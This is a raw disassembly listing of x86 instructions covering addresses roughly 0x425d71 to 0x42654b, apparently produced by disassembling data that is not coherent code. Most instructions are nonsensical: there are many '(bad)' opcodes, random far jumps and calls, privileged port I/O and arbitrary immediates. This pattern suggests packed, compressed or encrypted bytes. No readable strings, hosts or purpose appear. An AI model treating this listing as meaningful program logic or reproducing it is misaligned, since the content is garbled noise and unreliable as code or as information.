  425d71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425d72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425d73:	fsubr  st(3),st
  425d75:	cmp    bl,BYTE PTR [ecx+0x5]
  425d78:	cdq    
  425d79:	adc    al,0x0
  425d7b:	xchg   DWORD PTR [ecx],esi
  425d7d:	mov    esi,DWORD PTR [ecx+0x40]
  425d80:	(bad)  
  425d81:	rcr    BYTE PTR [edx+0x7f],1
  425d84:	xor    BYTE PTR [eax+ecx*2-0x3b],ah
  425d88:	sub    BYTE PTR [edi-0x55],dl
  425d8b:	push   ebp
  425d8c:	aaa    
  425d8d:	repz test al,0xf0
  425d90:	lds    esp,FWORD PTR [esi]
  425d92:	nop
  425d93:	pop    ds
  425d94:	gs pop es
  425d96:	addr16 pop ecx
  425d98:	xor    BYTE PTR [ebx-0x5b],0x1f
  425d9c:	pop    es
  425d9d:	jmp    0x425db6
  425d9f:	stos   BYTE PTR es:[edi],al
  425da0:	mov    cl,0x9c
  425da2:	aaa    
  425da3:	push   esp
  425da4:	cwde   
  425da5:	or     al,0xd4
  425da7:	sbb    al,0x4
  425da9:	mov    bl,0xb7
  425dab:	and    edx,DWORD PTR [edx-0x3544612e]
  425db1:	jnp    0x425dbc
  425db3:	dec    eax
  425db4:	mov    ecx,0xe9f42b2e
  425db9:	sub    al,0x60
  425dbb:	cli    
  425dbc:	dec    esp
  425dbd:	repz js 0x425dd1
  425dc0:	out    0x78,eax
  425dc2:	dec    esi
  425dc3:	jb     0x425d8b
  425dc5:	sbb    al,0x4e
  425dc7:	std    
  425dc8:	iret   
  425dc9:	sahf   
  425dca:	adc    BYTE PTR [eax+0x3e],0x32
  425dce:	xchg   edx,eax
  425dcf:	pop    ds
  425dd0:	(bad)  
  425dd1:	lds    esi,FWORD PTR [eax+0x5acfbfa1]
  425dd7:	xor    ah,cl
  425dd9:	add    edx,DWORD PTR ds:0x9eb140cd
  425ddf:	jns    0x425e41
  425de1:	inc    ecx
  425de2:	or     BYTE PTR gs:[ebx+0x61],dh
  425de6:	jecxz  0x425d89
  425de8:	cmp    edi,ebx
  425dea:	sbb    dh,BYTE PTR [edi-0x66048671]
  425df0:	repnz pop ebp
  425df2:	jmp    0xf9e8:0x310e8320
  425df9:	out    0x63,al
  425dfb:	dec    edi
  425dfc:	mov    WORD PTR [ebp-0x702c7908],es
  425e02:	mov    al,0xd0
  425e04:	not    DWORD PTR [ebx-0x6e]
  425e07:	push   cs
  425e08:	cmp    ecx,DWORD PTR [edx-0x25]
  425e0b:	pop    ebp
  425e0c:	inc    ebp
  425e0d:	lods   eax,DWORD PTR ds:[esi]
  425e0e:	and    DWORD PTR [eax],eax
  425e10:	mov    eax,0x4ec7c290
  425e15:	xchg   edx,eax
  425e16:	(bad)  
  425e17:	fld    st(2)
  425e19:	xor    BYTE PTR [ebp-0x2b],bh
  425e1c:	sub    esp,DWORD PTR [ebp-0x72]
  425e1f:	ja     0x425e83
  425e21:	aas    
  425e22:	push   eax
  425e23:	lock mov edi,0x4f2448a3
  425e29:	hlt    
  425e2a:	mov    al,ds:0x7586dca3
  425e2f:	sar    edi,0xdd
  425e32:	arpl   WORD PTR [ebx],sp
  425e34:	jg     0x425de0
  425e36:	inc    edi
  425e37:	jno    0x425e9d
  425e39:	sub    ch,al
  425e3b:	cmp    esi,edx
  425e3d:	fldcw  WORD PTR [ecx-0x6d7910c3]
  425e43:	nop
  425e44:	mov    ecx,0x2f32eeb5
  425e49:	push   0x7bd0830
  425e4e:	mov    ds:0xf49c6617,al
  425e53:	(bad)  
  425e54:	or     DWORD PTR [eax+0x107798b7],ecx
  425e5a:	jecxz  0x425ec0
  425e5c:	lea    ebp,[ebp-0x54]
  425e5f:	arpl   WORD PTR [ecx+0x2f],cx
  425e62:	out    0x12,eax
  425e64:	dec    esi
  425e65:	and    dh,BYTE PTR [ebx+0x4e9053ab]
  425e6b:	stos   BYTE PTR es:[edi],al
  425e6c:	das    
  425e6d:	push   eax
  425e6e:	sahf   
  425e6f:	xor    cl,BYTE PTR [ebp+ebp*2-0x79c567c0]
  425e76:	add    bh,dl
  425e78:	mov    cl,0xa9
  425e7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425e7b:	jg     0x425ee5
  425e7d:	cs push edx
  425e7f:	jecxz  0x425e1c
  425e81:	push   0x62
  425e83:	jmp    0x425e60
  425e85:	push   ecx
  425e86:	xchg   ecx,eax
  425e87:	jecxz  0x425e26
  425e89:	sbb    eax,0x3895cc73
  425e8e:	or     eax,0xeb611fa3
  425e93:	xchg   ecx,eax
  425e94:	sub    edi,DWORD PTR [ecx]
  425e96:	shr    dh,1
  425e98:	leave  
  425e99:	cmp    eax,0x990bca95
  425e9e:	arpl   ax,dx
  425ea0:	cmp    al,0x3e
  425ea2:	mov    BYTE PTR [edx],dh
  425ea4:	daa    
  425ea5:	jb     0x425ead
  425ea7:	push   edi
  425ea8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425ea9:	pushf  
  425eaa:	dec    edx
  425eab:	cmp    ebx,DWORD PTR [ebx+0x284e3c6c]
  425eb1:	(bad)  
  425eb2:	in     al,dx
  425eb3:	dec    ebp
  425eb4:	pushf  
  425eb5:	xor    ebx,edi
  425eb7:	lods   eax,DWORD PTR ds:[esi]
  425eb8:	mov    edx,0xdcdd21f6
  425ebd:	sbb    cl,BYTE PTR [eax-0x78]
  425ec0:	sub    DWORD PTR [edx-0x41],edi
  425ec3:	mov    al,0x53
  425ec5:	mov    eax,ss
  425ec7:	xor    bl,BYTE PTR [esi+0x36]
  425eca:	mov    DWORD PTR [esi+0x3a],esp
  425ecd:	jecxz  0x425ed9
  425ecf:	pop    esp
  425ed0:	cli    
  425ed1:	sbb    bl,ch
  425ed3:	jns    0x425f20
  425ed5:	pusha  
  425ed6:	sbb    DWORD PTR [eax],edx
  425ed8:	inc    eax
  425ed9:	aaa    
  425eda:	dec    esi
  425edb:	sbb    ebp,edx
  425edd:	jne    0x425f21
  425edf:	sahf   
  425ee0:	cmp    al,0xda
  425ee2:	jbe    0x425f4a
  425ee4:	retf   
  425ee5:	nop
  425ee6:	fnsave [ecx]
  425ee8:	push   ss
  425ee9:	out    dx,eax
  425eea:	pop    esi
  425eeb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425eec:	mov    ecx,0x97c84820
  425ef1:	ss jnp 0x425f42
  425ef4:	jae    0x425f03
  425ef6:	pusha  
  425ef7:	aaa    
  425ef8:	call   0x78fd:0x2c478141
  425eff:	jg     0x425ecf
  425f01:	dec    esi
  425f02:	adc    al,0x10
  425f04:	inc    bl
  425f06:	clc    
  425f07:	std    
  425f08:	add    ebx,ebp
  425f0a:	ret    0xbd42
  425f0d:	jmp    0x425f7b
  425f0f:	jb     0x425f83
  425f11:	sahf   
  425f12:	rol    eax,1
  425f14:	mov    eax,DWORD PTR [esi]
  425f16:	arpl   WORD PTR [esi-0x2eafd4d3],ax
  425f1c:	inc    ecx
  425f1d:	xlat   BYTE PTR ds:[ebx]
  425f1e:	pop    edx
  425f1f:	xor    eax,0x87ca3ea2
  425f25:	push   edi
  425f26:	pop    ecx
  425f27:	in     al,dx
  425f28:	loopne 0x425f51
  425f2a:	mov    ecx,es
  425f2c:	dec    esp
  425f2d:	sub    ch,BYTE PTR [ecx]
  425f2f:	ror    cl,1
  425f31:	inc    esp
  425f32:	bound  edi,QWORD PTR [edx-0x1b8e75cc]
  425f38:	loope  0x425ebe
  425f3a:	cmp    eax,DWORD PTR [edx+0x26ce0ef2]
  425f40:	lods   eax,DWORD PTR ds:[esi]
  425f41:	dec    ebp
  425f42:	call   0xc6a:0x6775b7f8
  425f49:	inc    ebp
  425f4a:	jecxz  0x425efd
  425f4c:	dec    ebp
  425f4d:	inc    ecx
  425f4e:	inc    esi
  425f4f:	inc    esi
  425f50:	outs   dx,BYTE PTR ds:[esi]
  425f51:	or     BYTE PTR [eax],bh
  425f53:	and    eax,edi
  425f55:	cmc    
  425f56:	std    
  425f57:	mov    eax,ds:0x93b39493
  425f5c:	stc    
  425f5d:	stos   BYTE PTR es:[edi],al
  425f5e:	cmp    DWORD PTR [ebp-0x48874d68],edi
  425f64:	ins    DWORD PTR es:[edi],dx
  425f65:	out    dx,al
  425f66:	dec    eax
  425f67:	push   ebx
  425f68:	in     al,0x41
  425f6a:	xchg   esp,eax
  425f6b:	pop    esi
  425f6c:	enter  0x7d4c,0xa8
  425f70:	ja     0x425fc0
  425f72:	scas   al,BYTE PTR es:[edi]
  425f73:	pop    ebx
  425f74:	nop
  425f75:	jmp    0x4188:0x712c02e5
  425f7c:	lea    ebp,[ebx-0x34]
  425f7f:	scas   eax,DWORD PTR es:[edi]
  425f80:	sub    al,0x9e
  425f82:	stc    
  425f83:	or     DWORD PTR [eax+0x36d215e],ecx
  425f89:	dec    edi
  425f8a:	js     0x425f9b
  425f8c:	aas    
  425f8d:	push   ss
  425f8e:	int    0xe4
  425f90:	rcr    DWORD PTR [esi-0x6d80f420],0xd0
  425f97:	frstor [ebp+ebx*2-0x10c7eac0]
  425f9e:	outs   dx,BYTE PTR ds:[esi]
  425f9f:	push   0x14d1cc6c
  425fa4:	mov    cl,0x8e
  425fa7:	lods   al,BYTE PTR ds:[esi]
  425fa8:	jae    0x425f31
  425faa:	dec    eax
  425fab:	(bad)  
  425fac:	adc    DWORD PTR [eax],esp
  425fae:	mov    eax,ds:0xa694455a
  425fb3:	dec    esi
  425fb4:	stc    
  425fb5:	hlt    
  425fb6:	(bad)  
  425fb8:	lahf   
  425fb9:	arpl   WORD PTR [esi+0x70],bx
  425fbc:	cmc    
  425fbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425fbe:	rcr    BYTE PTR [edi+0x268b266a],cl
  425fc4:	cdq    
  425fc5:	xchg   esp,eax
  425fc6:	fcom   DWORD PTR [edi+ebp*8]
  425fc9:	sbb    al,0xee
  425fcb:	out    dx,al
  425fcc:	inc    edi
  425fcd:	mov    eax,0xc6cd3717
  425fd2:	push   ebx
  425fd3:	das    
  425fd4:	or     eax,edx
  425fd6:	xor    eax,0xd6a4f315
  425fdb:	adc    eax,0x4eebaccb
  425fe0:	mov    DWORD PTR [ebp+0x67971bb3],eax
  425fe6:	xchg   ebp,eax
  425fe7:	addr16 mov eax,ds:0xb419
  425feb:	int3   
  425fec:	icebp  
  425fed:	fcmovu st,st(7)
  425fef:	add    BYTE PTR [edi+0x6d06d350],cl
  425ff5:	scas   al,BYTE PTR es:[edi]
  425ff6:	jecxz  0x425f99
  425ff8:	je     0x425fe9
  425ffa:	mov    ch,0x6
  425ffc:	stos   DWORD PTR es:[edi],eax
  425ffd:	fisttp WORD PTR [ebp-0x43c08d4d]
  426003:	mov    ds:0x5dcb348e,al
  426008:	hlt    
  426009:	stos   BYTE PTR es:[edi],al
  42600a:	std    
  42600b:	imul   esp,DWORD PTR ds:0xce6f5954,0x3df8c13
  426015:	retf   
  426016:	inc    esp
  426017:	sti    
  426018:	mov    DWORD PTR [edx+0x5758fe4],eax
  42601e:	or     al,0x7c
  426020:	sub    dl,BYTE PTR [esi+0x19]
  426023:	push   ss
  426024:	fdivr  DWORD PTR [ebp-0x16]
  426027:	(bad)  ds:0x1dd658e3
  42602d:	js     0x426019
  42602f:	adc    BYTE PTR [edi],dh
  426031:	mov    ebp,DWORD PTR [ecx-0x770cbe8]
  426037:	int    0xbe
  426039:	and    ebx,DWORD PTR [esi+ecx*8]
  42603c:	inc    ebp
  42603d:	sub    ah,BYTE PTR [esi]
  42603f:	test   eax,0x83123eec
  426044:	js     0x426054
  426046:	mov    ecx,0x10311804
  42604b:	add    al,0xe5
  42604d:	sub    eax,0x2a31800d
  426052:	repnz sub BYTE PTR [edx],dh
  426055:	and    ebx,edi
  426057:	ja     0x426038
  426059:	fild   QWORD PTR [edi+0x53]
  42605c:	xchg   BYTE PTR [edi],dl
  42605e:	xlat   BYTE PTR ds:[ebx]
  42605f:	add    eax,0xaf2be61a
  426064:	pusha  
  426065:	out    dx,eax
  426066:	int3   
  426067:	xor    al,0xb9
  426069:	shr    BYTE PTR [ebx],1
  42606b:	sbb    eax,0x9f7038ce
  426070:	sbb    bh,BYTE PTR [esi+0x43154932]
  426076:	mov    bl,0x9c
  426078:	(bad)  
  426079:	aad    0xde
  42607b:	call   0xfd7bc418
  426080:	inc    edi
  426081:	and    edi,esp
  426083:	std    
  426084:	ins    BYTE PTR es:[edi],dx
  426085:	sbb    BYTE PTR [edi+0x62],0xce
  426089:	dec    ecx
  42608a:	xor    BYTE PTR [ebx-0x42],bl
  42608d:	mov    eax,ds:0xffbb2017
  426092:	sbb    edi,DWORD PTR [esi-0x6c]
  426095:	popa   
  426096:	cmc    
  426097:	jb     0x426103
  426099:	in     eax,dx
  42609a:	aas    
  42609b:	imul   edi,DWORD PTR [esi+0x3e],0x6a
  42609f:	inc    esi
  4260a0:	nop
  4260a1:	xchg   ecx,eax
  4260a2:	pop    es
  4260a3:	lahf   
  4260a4:	sub    ah,BYTE PTR [eax+0x105b06a1]
  4260aa:	(bad)  
  4260ab:	fild   WORD PTR [eax-0x21b8b655]
  4260b1:	retf   
  4260b2:	mov    dl,0x8c
  4260b4:	inc    ebp
  4260b5:	shl    BYTE PTR ds:0x4144b372,0x9e
  4260bc:	push   eax
  4260bd:	dec    eax
  4260be:	arpl   WORD PTR [ebp-0x124e6666],dx
  4260c4:	and    al,0x23
  4260c6:	loopne 0x42606f
  4260c8:	sbb    DWORD PTR [ecx+0x59],0xcc2cd32f
  4260cf:	xlat   BYTE PTR ds:[ebx]
  4260d0:	cmp    BYTE PTR [esi],dl
  4260d2:	xor    al,BYTE PTR ss:[eax]
	...
  4260e1:	sbb    ch,al
  4260e3:	mov    ebx,esp
  4260e5:	sti    
  4260e6:	call   FWORD PTR [edi-0x12]
  4260e9:	dec    edx
  4260ea:	pop    esi
  4260eb:	popa   
  4260ec:	sub    edx,ecx
  4260ee:	scas   eax,DWORD PTR es:[edi]
  4260ef:	mov    ebp,0x1d77661
  4260f4:	add    BYTE PTR [ebx-0x3cfffffd],ch
  4260fa:	scas   al,BYTE PTR es:[edi]
  4260fb:	hlt    
  4260fc:	xchg   esp,eax
  4260fd:	fdiv   QWORD PTR [edi]
  4260ff:	test   eax,0x476e8953
  426104:	fs pop es
  426106:	and    BYTE PTR [esi-0x14],cl
  426109:	xchg   BYTE PTR [ecx-0x10],bh
  42610c:	pop    edx
  42610d:	mov    ebx,0x2a5082f3
  426112:	xchg   ecx,eax
  426113:	mov    ?,WORD PTR ds:0x4a393a6f
  426119:	jb     0x42612b
  42611b:	fnsave [edi]
  42611d:	dec    edi
  42611e:	push   eax
  42611f:	dec    eax
  426120:	retf   0x86c5
  426123:	jg     0x426121
  426125:	pusha  
  426126:	jmp    0xc61e:0x7847500c
  42612d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42612e:	repz sub ch,BYTE PTR [ecx-0x45fcd98e]
  426135:	test   BYTE PTR [edx+ebp*2-0x1193bbee],dh
  42613c:	jmp    0xc902:0x7f6b199
  426143:	in     eax,dx
  426144:	stc    
  426145:	inc    esp
  426146:	pop    eax
  426147:	jmp    0x6ad1ed65
  42614c:	jne    0x4261c5
  42614e:	push   0xffffffa0
  426150:	mov    ds:0x2dea847b,al
  426155:	icebp  
  426156:	dec    eax
  426157:	out    0x7d,eax
  426159:	jge    0x426178
  42615b:	adc    esi,DWORD PTR [edx+0x74212a38]
  426161:	je     0x4261a4
  426163:	fist   DWORD PTR [eax]
  426165:	stos   BYTE PTR es:[edi],al
  426166:	test   BYTE PTR [ecx-0x6a],al
  426169:	arpl   WORD PTR [ebp+eax*2-0x151ce72a],bp
  426170:	mov    dh,0x17
  426172:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426173:	clc    
  426174:	or     eax,0xdcd62331
  426179:	pop    ds
  42617a:	sbb    al,BYTE PTR [esi-0x73a3e13c]
  426180:	xchg   ebx,eax
  426181:	popf   
  426182:	pop    esi
  426183:	sbb    DWORD PTR [eax+ebp*2+0x36b7ceec],0xee30409b
  42618e:	nop
  42618f:	loop   0x426111
  426191:	loopne 0x42619b
  426193:	bound  esp,QWORD PTR [ebx-0x74]
  426196:	mov    al,ds:0x5fa9e657
  42619b:	pop    ebp
  42619c:	jg     0x426149
  42619e:	fbld   TBYTE PTR [edx+0x37]
  4261a1:	bound  edx,QWORD PTR [edx+0x6bcb4b5]
  4261a7:	mov    ebp,0x1994bf7a
  4261ac:	cmc    
  4261ad:	retf   
  4261ae:	or     BYTE PTR [esi-0x3],bl
  4261b1:	outs   dx,BYTE PTR ds:[esi]
  4261b2:	int3   
  4261b3:	xchg   esi,eax
  4261b4:	into   
  4261b5:	scas   eax,DWORD PTR es:[edi]
  4261b6:	or     DWORD PTR [edx],0x8e5fecb2
  4261bc:	(bad)  [ebx+ecx*8+0x28]
  4261c0:	mov    ebx,0x67742e76
  4261c5:	or     cl,BYTE PTR [eax+0xc9d4d23]
  4261cb:	sbb    DWORD PTR [eax-0x32],0x5f6eaa84
  4261d2:	jge    0x4261aa
  4261d4:	dec    esi
  4261d5:	and    ah,dl
  4261d7:	sub    ebx,edx
  4261d9:	lods   al,BYTE PTR ds:[esi]
  4261da:	fsub   st,st(2)
  4261dc:	or     eax,0x532b9590
  4261e1:	xor    al,0x9f
  4261e3:	cmp    ah,bl
  4261e5:	push   DWORD PTR [edi+0x1d]
  4261e8:	lock sub ch,BYTE PTR [esi-0x30cb542a]
  4261ef:	adc    eax,0xfdd4659a
  4261f4:	xor    DWORD PTR [ebp-0x6],ebx
  4261f7:	gs je  0x426194
  4261fa:	add    eax,0x30a2b101
  4261ff:	jne    0x426260
  426201:	lods   al,BYTE PTR ds:[esi]
  426202:	push   ds
  426203:	xchg   edi,eax
  426204:	jge    0x15d2c7e9
  42620a:	xor    dh,BYTE PTR [edx-0x16b24b26]
  426210:	pushw  es
  426212:	jmp    0x9bf67207
  426217:	ss (bad) 
  426219:	push   esi
  42621a:	and    DWORD PTR [edi+0x31],ecx
  42621d:	add    DWORD PTR [ebp-0x6a67ccc7],esp
  426223:	out    0xf8,al
  426225:	arpl   WORD PTR [edx+0x60f15b0],di
  42622b:	shl    DWORD PTR ds:0xec21af86,0xfa
  426232:	ja     0x4262ab
  426234:	cli    
  426235:	cmp    al,0x24
  426237:	dec    edx
  426238:	dec    ebx
  426239:	aaa    
  42623a:	fsub   DWORD PTR ds:0xbb1e8057
  426240:	retf   
  426241:	popf   
  426242:	int3   
  426243:	outs   dx,DWORD PTR ds:[esi]
  426244:	push   es
  426245:	inc    esi
  426246:	les    esi,FWORD PTR [esi+eax*2]
  426249:	lahf   
  42624a:	add    ebp,ebp
  42624c:	dec    eax
  42624d:	and    dl,dl
  42624f:	bound  ecx,QWORD PTR [ebp-0x586043d1]
  426255:	mov    ebx,0xa9d625a2
  42625a:	in     al,dx
  42625b:	fld    QWORD PTR [eax]
  42625d:	movhps xmm3,QWORD PTR [esi+esi*8-0x4fddb371]
  426265:	outs   dx,DWORD PTR ds:[esi]
  426266:	cmp    al,0xc0
  426268:	xor    bl,dh
  42626a:	jmp    0x426224
  42626c:	outs   dx,BYTE PTR ds:[esi]
  42626d:	jge    0x4262b4
  42626f:	mov    ecx,0xa241a86d
  426274:	neg    esi
  426276:	inc    esp
  426277:	jecxz  0x4261fc
  426279:	scas   eax,DWORD PTR es:[edi]
  42627a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42627c:	xor    eax,0x6698c5c
  426281:	push   0x288037ef
  426286:	sbb    eax,0x924190fe
  42628b:	test   DWORD PTR [ebx],eax
  42628d:	jae    0x4262d4
  42628f:	test   BYTE PTR [ebx],ch
  426291:	cmp    ah,BYTE PTR [ecx]
  426293:	sti    
  426294:	cli    
  426295:	xor    DWORD PTR [di],ecx
  426298:	arpl   WORD PTR [edx-0x4a88a3be],si
  42629e:	mov    esi,0x7ab1c81f
  4262a3:	pop    ss
  4262a4:	in     eax,dx
  4262a5:	sub    DWORD PTR [edx],ecx
  4262a7:	xor    al,0xdc
  4262a9:	fimul  WORD PTR [esi+0x59]
  4262ac:	out    0xcd,al
  4262ae:	or     al,0x9e
  4262b0:	push   edx
  4262b1:	adc    BYTE PTR [eax+0x19],dh
  4262b4:	sub    al,ah
  4262b6:	push   ss
  4262b7:	rcr    DWORD PTR [ecx],cl
  4262b9:	pop    edi
  4262ba:	mov    BYTE PTR [eax+0x61],dl
  4262bd:	mov    esp,0xd64ce60c
  4262c2:	mov    al,ds:0x8f06c4c
  4262c7:	inc    esp
  4262c8:	inc    ebx
  4262c9:	xor    BYTE PTR [edi],bl
  4262cb:	fnstenv [edi+ebp*8+0x3b6a163c]
  4262d2:	mov    ds:0xd32bedc4,al
  4262d7:	fsubr  st,st(0)
  4262d9:	stc    
  4262da:	sbb    eax,0x8ac1d887
  4262df:	jg     0x4262e0
  4262e1:	xor    cl,cl
  4262e3:	shl    BYTE PTR [ebx-0x5bdb24f],0xc0
  4262ea:	mov    ds:0x2091b2f0,eax
  4262ef:	dec    DWORD PTR [ebx-0x4abf6ee]
  4262f5:	inc    edx
  4262f6:	lds    ecx,FWORD PTR [esi-0x122a1c7d]
  4262fc:	outs   dx,BYTE PTR ds:[esi]
  4262fd:	mov    ebp,0x709b45d7
  426302:	les    esi,FWORD PTR [esi-0x33]
  426305:	xchg   ebp,eax
  426306:	addr16 xchg esp,eax
  426308:	jae    0x4262c1
  42630a:	cli    
  42630b:	and    al,0xa9
  42630d:	jo     0x426311
  42630f:	ins    DWORD PTR es:[edi],dx
  426310:	test   al,0x60
  426312:	xchg   ch,cl
  426314:	cwde   
  426315:	mov    ebx,0x1fae5234
  42631a:	sar    BYTE PTR [edx+0x72ddcc98],0xf7
  426321:	xor    edi,0xffffffa9
  426324:	xchg   DWORD PTR [edx+0x451b666e],esp
  42632a:	in     eax,0xa5
  42632c:	sbb    ch,dl
  42632e:	push   esp
  42632f:	xor    ah,dh
  426331:	xchg   esp,eax
  426332:	or     al,BYTE PTR [ebx+0x5]
  426335:	jg     0x426340
  426337:	cmp    eax,0xd76914f6
  42633c:	add    eax,0x1758111
  426341:	loop   0x426371
  426343:	sti    
  426344:	(bad)  
  426345:	repz lock cdq 
  426348:	add    BYTE PTR [edx],0x72
  42634b:	ss adc eax,0x1596a0b
  426351:	xchg   ebp,eax
  426352:	(bad)
  426355:	scas   al,BYTE PTR es:[edi]
  426356:	sbb    eax,0x64888dac
  42635b:	in     eax,dx
  42635c:	jecxz  0x4263d2
  42635e:	adc    al,0x84
  426360:	adc    eax,0xc29efb42
  426365:	ret    0xc6e
  426368:	lods   eax,DWORD PTR ds:[esi]
  426369:	stos   DWORD PTR es:[edi],eax
  42636a:	jp     0x42631f
  42636c:	cli    
  42636d:	js     0x426399
  42636f:	jge    0x42632b
  426371:	jmp    0x1963:0x848da25
  426378:	pop    edi
  426379:	push   ebx
  42637a:	int3   
  42637b:	mov    bl,0xfa
  42637d:	jmp    0x7b2b2901
  426382:	mov    al,ds:0xe910236
  426387:	out    0x19,eax
  426389:	mov    edx,0x37cc68ad
  42638e:	dec    esp
  42638f:	sub    BYTE PTR [eax+0x356efe9d],dl
  426395:	xor    esp,DWORD PTR [ebp-0x17]
  426398:	test   BYTE PTR [eax-0x44],ah
  42639b:	add    eax,DWORD PTR [edi+0x3f9b84b3]
  4263a1:	xor    al,0xb2
  4263a3:	test   cl,ch
  4263a5:	les    eax,FWORD PTR [eax]
  4263a7:	fmul   DWORD PTR [edx-0x2affe1b5]
  4263ad:	xchg   esp,eax
  4263ae:	or     ebx,esi
  4263b0:	push   ss
  4263b1:	sbb    ch,BYTE PTR [ebx+0x6402b26e]
  4263b7:	sar    dh,cl
  4263b9:	and    eax,0xc6779b3a
  4263be:	jmp    0x6159caf7
  4263c3:	(bad)  [edx-0x3a]
  4263c6:	sti    
  4263c7:	sahf   
  4263c8:	stos   DWORD PTR es:[edi],eax
  4263c9:	scas   eax,DWORD PTR es:[edi]
  4263ca:	dec    ebx
  4263cb:	int3   
  4263cc:	ins    BYTE PTR es:[edi],dx
  4263cd:	(bad)  
  4263ce:	loopne 0x4263cd
  4263d0:	jno    0x426405
  4263d2:	leave  
  4263d3:	aad    0xae
  4263d5:	xchg   esp,eax
  4263d6:	dec    esi
  4263d7:	test   al,0x7
  4263d9:	jae    0x426444
  4263db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4263dc:	and    eax,0xac77200c
  4263e1:	mov    esi,0x409b2833
  4263e6:	dec    edx
  4263e7:	mov    eax,ds:0x3ba73d3c
  4263ec:	std    
  4263ed:	xchg   esp,eax
  4263ee:	add    eax,0x4259e0b3
  4263f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4263f4:	mov    cl,0x13
  4263f6:	cdq    
  4263f7:	fiadd  DWORD PTR [edx]
  4263f9:	inc    edx
  4263fa:	mov    esi,0x24798e23
  4263ff:	call   0xd7463389
  426404:	mov    cl,0x84
  426406:	push   esi
  426407:	fcomip st,st(6)
  426409:	ins    BYTE PTR es:[edi],dx
  42640a:	fs aaa 
  42640c:	je     0x426485
  42640e:	jge    0x4263f8
  426410:	pop    edi
  426411:	jbe    0x4263a3
  426413:	out    dx,eax
  426414:	push   0x7f
  426416:	scas   al,BYTE PTR es:[edi]
  426417:	pop    edx
  426418:	sub    ebp,0x48cdbec1
  42641e:	sbb    bh,dl
  426420:	repz push eax
  426422:	add    al,0x16
  426424:	jno    0x4263f3
  426426:	add    al,0x4d
  426428:	rcl    BYTE PTR [eax],cl
  42642a:	dec    edi
  42642b:	mov    eax,0x272402e5
  426430:	or     BYTE PTR [ebx+eax*4-0x17147c2],bl
  426437:	mov    ds:0x28093b16,eax
  42643c:	sbb    al,0xf2
  42643e:	je     0x4263db
  426440:	mov    bh,0x55
  426442:	rcr    BYTE PTR [eax+0x6],0x85
  426446:	cmp    esp,DWORD PTR [esi]
  426448:	dec    eax
  426449:	or     al,BYTE PTR [eax+ebp*4-0x281f8ad]
  426450:	jg     0x426472
  426452:	fistp  DWORD PTR [esi-0x78220781]
  426458:	pop    es
  426459:	adc    ch,bh
  42645b:	mov    ?,WORD PTR [edx]
  42645d:	fsub   DWORD PTR [esi]
  42645f:	addr16 xchg ebp,eax
  426461:	int    0x93
  426463:	lds    eax,FWORD PTR [edi]
  426465:	ins    BYTE PTR es:[edi],dx
  426466:	lahf   
  426467:	add    BYTE PTR [edi+0x5a4b9a24],bl
  42646d:	lods   eax,DWORD PTR ds:[esi]
  42646e:	xor    ecx,eax
  426470:	lock call 0xe987ec10
  426476:	lods   al,BYTE PTR ds:[esi]
  426477:	mov    ds:0x49870162,al
  42647c:	add    al,0xea
  42647e:	bsf    esi,DWORD PTR [edi+0xf91eefe]
  426485:	repnz push ds
  426487:	(bad)
  42648a:	cmp    al,0x9e
  42648c:	(bad)  
  42648d:	fld    DWORD PTR [eax]
  42648f:	add    eax,0x32926d35
  426494:	ss jmp 0x426441
  426497:	lods   al,BYTE PTR ds:[esi]
  426498:	jp     0x4264be
  42649a:	jmp    0xc1c32aa8
  42649f:	xor    al,0x6f
  4264a1:	jae    0x426447
  4264a3:	xor    al,0x0
	...
  4264b1:	loop   0x42652e
  4264b3:	push   ecx
  4264b4:	data16 fldcw WORD PTR [esi-0x9]
  4264b8:	dec    DWORD PTR [eax+0x6f]
  4264bb:	std    
  4264bc:	or     eax,DWORD PTR [eiz*2-0x24defad3]
  4264c3:	add    DWORD PTR [eax],eax
  4264c5:	stos   DWORD PTR es:[edi],eax
  4264c6:	add    eax,DWORD PTR [eax]
  4264c8:	add    BYTE PTR [esi-0x65],ch
  4264cb:	mov    ah,0xed
  4264cd:	dec    esp
  4264ce:	scas   eax,DWORD PTR es:[edi]
  4264cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4264d0:	push   ebx
  4264d1:	in     eax,dx
  4264d2:	js     0x426462
  4264d4:	cmp    bl,BYTE PTR fs:[esi-0x2ae9caf4]
  4264db:	sbb    esi,esi
  4264dd:	lea    ebx,cs:[edi+ebp*8-0x3d674b36]
  4264e5:	and    edi,ecx
  4264e7:	icebp  
  4264e8:	jp     0x426535
  4264ea:	fld    st(3)
  4264ec:	add    ebp,DWORD PTR [eax]
  4264ee:	out    0x87,eax
  4264f0:	sub    eax,0x7fe8987d
  4264f5:	ins    DWORD PTR es:[edi],dx
  4264f6:	sbb    DWORD PTR [eax-0x7f62745f],ecx
  4264fc:	pop    es
  4264fd:	inc    ebp
  4264fe:	or     al,0x75
  426500:	inc    ecx
  426501:	add    edx,ebx
  426503:	pusha  
  426504:	mov    dh,0x78
  426506:	(bad)  
  426507:	pop    esp
  426508:	scas   eax,DWORD PTR es:[edi]
  426509:	xchg   ebx,eax
  42650a:	mov    esi,0xa3373bdf
  42650f:	dec    edi
  426510:	ffree  st(6)
  426512:	es adc al,0xfa
  426515:	cwde   
  426516:	ret    0x8bea
  426519:	(bad)  
  42651a:	sub    bl,BYTE PTR [eax+0x4]
  42651d:	jl     0x42656b
  42651f:	cmp    DWORD PTR [edx+0x5d],esp
  426522:	jge    0x426599
  426524:	fld    TBYTE PTR [edx+ebp*2-0x238aed53]
  42652b:	inc    edi
  42652c:	xor    DWORD PTR [ecx-0x53b820b8],0x417dd5f5
  426536:	adc    esp,edx
  426538:	fidivr WORD PTR [eax]
  42653a:	mov    ebp,0xdcf2ca8a
  42653f:	sub    ebp,DWORD PTR [eax-0x7e]
  426542:	xchg   ecx,eax
  426543:	or     ecx,DWORD PTR [ebp-0xe63c5a6]
  426549:	jp     0x42659b
  42654b:	inc    esi
